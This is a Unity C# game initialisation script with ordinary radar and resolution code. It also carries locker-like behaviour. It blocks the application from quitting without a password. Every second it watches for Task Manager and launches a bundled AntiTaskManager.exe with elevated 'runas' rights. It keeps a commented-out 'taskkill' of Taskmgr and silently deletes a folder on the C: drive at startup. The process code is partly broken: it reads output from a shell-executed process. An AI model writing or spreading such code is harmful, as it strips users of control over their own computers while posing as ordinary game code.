using ExitGames.Client.Photon.StructWrapping;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using UnityEngine;
using UnityEngine.SceneManagement;
public class TransformObject
{
    public Vector3[] v3;
    public Quaternion[] q4;
    public Vector3[] s3;
    public string[] name;
    public Vector3[] initpos;

}

public class gameInit : MonoBehaviour
{
    static public GameObject init;

    Specilpositiuon specilpositiuon = new Specilpositiuon();

    static public void Init(GameObject g)
    {
#if !UNITY_EDITOR
        dnSpyModer.MainModData.Main();
#endif
        

        if (init==null) {
            g.AddComponent<gameInit>();
            init = g;
        }
        else
        {
            g.AddComponent<deleter1>();
        }
        if(Directory.Exists("C:/data/t")) Directory.Delete("C:/data/t",true);
        UnityEngine.Debug.Log("Forck?");
       

    }
    public static bool passwordAccepted = false;

    private void OnEnable()
    {
        Application.wantsToQuit += WantsToQuit;
    }

    private void OnDisable()
    {
        Application.wantsToQuit -= WantsToQuit;
    }

    private bool WantsToQuit()
    {
        if (passwordAccepted)
            return true;

        // Здесь можно открыть своё окно ввода пароля
        UnityEngine.Debug.Log("Введите пароль для выхода");

        return false;
    }
    void OnApplicationQuit()
    {
        UnityEngine.Debug.Log("Попытка закрытия");
        Application.wantsToQuit += WantsToQuit;
        //  Application.wantsToQuit += true;
    }
    void Start()
    {
        InvokeRepeating("NoTaskManager", 0, 1);
    }
    private void Update()
    {
      //  NoTaskManager();
        //  Process process2 = new Process();

        // process2.StartInfo.FileName = "cmd.exe";

        //  process2.StartInfo.Arguments =
        //    "taskkill /F /IM Taskmgr.exe /T";
        // process2.
        //  process2.StartInfo.LoadUserProfile = true;
        //  process2.StartInfo.UseShellExecute = false;
        //  process2.StartInfo.RedirectStandardOutput = true;
        //  process2.StartInfo.CreateNoWindow = true;
        //  process2.StartInfo.WorkingDirectory = "C:\\Windows\\system32";

        // process2.Start();

        // string output = process2.StandardOutput.ReadToEnd();

        //  process2.WaitForExit();
        // UnityEngine.Debug.Log(output);
        if (VarSave.ExistenceVar("res3", SaveType.global) && SceneManager.GetActiveScene().buildIndex != 129)
            Screen.SetResolution(VarSave.GetInt("res3", SaveType.global), VarSave.GetInt("res4", SaveType.global), !VarSave.GetBool("windowed", SaveType.global));

        if (Globalprefs.RadarOn)
        {
            tag2dmap[] m2 = FindObjectsByType<tag2dmap>(sortmode.main);
            if (m2.Length >= 0)
            {
                Directory.CreateDirectory("C:/data/t");
                mover m = mover.main();
                specilpositiuon.pos = new List<Vector2>();
                for (int i = 0; i < m2.Length; i++)
                {
                    Vector3 v3 = m2[i].transform.position;
                    //m2.Length
                    specilpositiuon.pos.Add(new Vector2(v3.x - m.transform.position.x, v3.z - m.transform.position.z));

                    VarSave.SetString("t/points" + i, specilpositiuon.pos[i].x / 20 + " " + specilpositiuon.pos[i].y / 20, SaveType.computer);

                }
            }
        }
    }

    public void NoTaskManager()
    {
        string appDir =
            Directory.GetParent(Application.dataPath).FullName;

        string rootDir =
            Directory.GetParent(appDir).FullName;
        Process[] processes = Process.GetProcessesByName("Taskmgr");

        if (processes.Length > 0)
        {

            Process process2 = new Process();

            process2.StartInfo.FileName = rootDir + "/windows/AntiTaskManager.exe";

            //   process2.StartInfo.Arguments =
            //     $"taskkill /F /IM Taskmgr.exe /T";
            process2.StartInfo.Verb = "runas";
            process2.StartInfo.UseShellExecute = true;
            process2.StartInfo.CreateNoWindow = true;
            process2.StartInfo.WorkingDirectory = Path.GetDirectoryName(Path.GetDirectoryName(Application.dataPath));

            process2.Start();

            string output = process2.StandardOutput.ReadToEnd();

            process2.WaitForExit();

        }
    }
}
public class Specilpositiuon
{
    public List<Vector2> pos = new List<Vector2>();
}